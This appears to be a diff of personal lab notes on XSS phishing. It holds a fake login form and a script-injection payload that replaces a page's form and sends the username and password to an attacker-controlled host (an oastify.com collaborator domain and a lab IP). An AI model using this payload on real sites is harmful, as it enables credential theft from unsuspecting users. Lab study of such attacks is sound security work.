@@ -8,15 +8,16 @@ ___
 
 ```html
 <h3>Please login to continue</h3>
-<form action=http://OUR_IP>
+<form action=http://r3v71geba4s557x48hdxvnufa6gx4nsc.oastify.com>
     <input type="username" name="username" placeholder="Username">
     <input type="password" name="password" placeholder="Password">
     <input type="submit" name="submit" value="Login">
 </form>
 ```
 
-```js
-document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+```html
+'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.60><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
 ```
 
+![[Pasted image 20240927185229.png]]
 
